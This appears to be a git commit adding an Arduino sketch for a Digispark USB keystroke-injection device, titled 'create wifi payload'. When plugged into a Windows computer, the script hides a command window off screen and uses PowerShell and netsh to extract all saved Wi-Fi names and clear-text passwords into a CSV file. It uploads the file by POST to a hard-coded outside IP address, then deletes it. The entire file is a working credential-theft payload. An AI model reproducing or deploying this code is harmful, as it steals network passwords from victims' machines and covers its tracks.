00068dee8d0b1d79ff2a182c4c86da7155da3a54
mariffy <mariff.yasri@petronas.com>
2023-11-13 02:29:08 +0800

    create wifi payload

---
+++ uni-bad/maklumat-nirwayar-wifi/script/script.ino
@@ -0,0 +1,45 @@
+#include "DigiKeyboard.h"
+#define KEY_DOWN 0x51 // Keyboard Down Arrow
+#define KEY_ENTER 0x28 //Return/Enter Key
+
+void setup() {
+    pinMode(1, OUTPUT); //LED on Model A 
+}
+
+void loop() {
+
+  DigiKeyboard.update();
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(3000);
+
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
+  DigiKeyboard.delay(500);
+  // DigiKeyboard.println("cmd"); //smallest cmd window possible
+  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
+  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
+  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
+  for(int i =0; i < 100; i++)
+    {
+        DigiKeyboard.sendKeyStroke(KEY_DOWN);
+    }
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
+  DigiKeyboard.delay(100);
+  DigiKeyboard.println("cd %temp%"); //going to temporary dir
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("powershell");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println(F("(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv -Path wifi.csv;"));
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("Invoke-WebRequest -Uri http://18.134.172.169/29622395-3621-4094-996b-1fd1ca730297.php -Method POST -InFile wifi.csv");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println(F("del wifi.csv"));
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println(F("exit"));
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println(F("exit"));
+  DigiKeyboard.delay(500);
+
+  for(;;){ /*empty*/ }
+}
